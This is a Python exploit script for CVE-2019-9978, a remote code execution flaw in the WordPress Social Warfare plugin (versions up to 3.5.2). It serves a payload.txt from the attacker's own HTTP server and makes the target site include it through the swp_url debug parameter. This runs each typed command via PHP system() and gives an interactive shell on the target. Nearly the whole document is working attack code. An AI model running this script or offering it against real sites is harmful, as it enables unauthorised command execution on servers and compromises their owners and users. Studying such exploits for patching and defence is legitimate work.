# Title: RCE in Social Warfare Plugin ( <=3.5.2 )
# CVE: CVE-2019-9978
# Script Authors: Jessi & Rin
# Usage: python3 social-warefare-rce.py http://example.com/wordpress/ lhost
# Setups an http server and serves as an interface to execute arbitrary commands via payload.txt and RFI/RCE vuln

import sys
import os
import requests
import re
import threading
import time

# Warn if no Arguments
if len(sys.argv) <= 1:
    print("Usage: python3 social-warfare-rce.py http://example.com/wordpress/ lhost")
    exit(1)

# Pretty ASCII Art/Intro :)
print("""\
@@@@@@@O@@@@@@@@@@@OOOOOOO@OOOOO@@@@@@@@@@@@OO@@@
@@@@@OooOO,OOOOOoooooooooooOOooooooO@@@OOOOOOO@@@
@@@@@ooooOO^=ooooooooooooooooooooooooOOOOOOOOO@@@
@@@@@ooooOOO/oooooooooooooooooooooooooOOOOOOo^@@@
@@@@@OooO/[[\oooooooooooooooooooooooOooOOOOoo=@@@
@@@@@Ooo`**/oooooooooooooooooooooooooOooOOOooO@@@
@@@@@@@OO`/ooooooooooooooooooooooooooOoooOO/@@@@@
@@@@@@@@ooooooooooooOo[ooooooooooooooOOooO@@@@@@@
@@@@@@@Oooooooo/=ooOO,oooOoooooooooooOOooOO@@@@@@
@@@@@@@OooooooO^=oOO^oooOO[oo/=ooooooOOOoOoO@@@@@
@@@@@@Ooooo/oO/`oO[ OOoO/  \O,oooooooOOOOOoO@@@@@
@@@@@@ooooo^oO^=`  ,O[`     O/oooooOOOO[OOOO@@@@@
@@@@@oooooO^O.O             ,ooooooO/= ,OOOOO@@@@
@@@OOoooooO^=^     [[\OO\            ,].OOOoo@@@@
@@@OoooooooO=\           `          O[  OOooooO@@
@@@@OOOooooOO/  ,]]]]]`                 OooooO@@@
@@@@OOOOO/  =`/`........,\`       ,]]]],OOOOO\@@@
@@@@@@@@    =...............[  /`........\@@O@@@@
@@@@@@@`   ,^.............................O@@@@@@
@@@@@@`    /...............................O@@@@@
@@@@@O     =..................../[[].......O@@@@@
@@@@@       ^..............,`[[..`   ^..../O@@@@@
@@@@O=/o]]] =`............,]]`  /    ,]`., =@@@@@
@@@@@@^                  .         =      [O@@@@@
@@@@@@@`                           ,\       O@@@@/""")
print("\n")
print("WordPress Social Warfare Plugin RCE <=3.5.2")
print("CVE-2019-9978")
print("\n")
time.sleep(5)
print("[!] Setting Up Exploit Handler [!]")
time.sleep(3)
print("[+] Spawning Shell [+]")
time.sleep(2)
os.system("clear")

# Required Arguments
target = sys.argv[1]
lhost = sys.argv[2]

# Create Background Task for HTTP Server
def payload_server():
    os.system("python3 -m http.server 80 >/dev/null 2>&1")
def setup_payload():
    threading.Thread(target=payload_server).start()

# Command Handler for Sending/Receiving HTTP Requests/Responses
def cmd_handler():
    url = target + 'wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://' + lhost+'/payload.txt'
    r = requests.get(url)
    output = re.search(r"^(.*)<\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))
    if output:
        resp = output.groups()[0]
        if resp:
            print(resp.replace("lnbreak", "\n" ))

# Interactive User Shell (Non-TTY)
def shell():
    cmd = input("social~warfare-shell$ ")
    if cmd == "exit":
        exit(0)
    if cmd == "clear":
        os.system("clear")
    f = open("payload.txt", "w")
    f.write("<pre>system('" + cmd+"')</pre>")
    f.close()

# Exploit
setup_payload()
while (True):
    shell()
    cmd_handler()
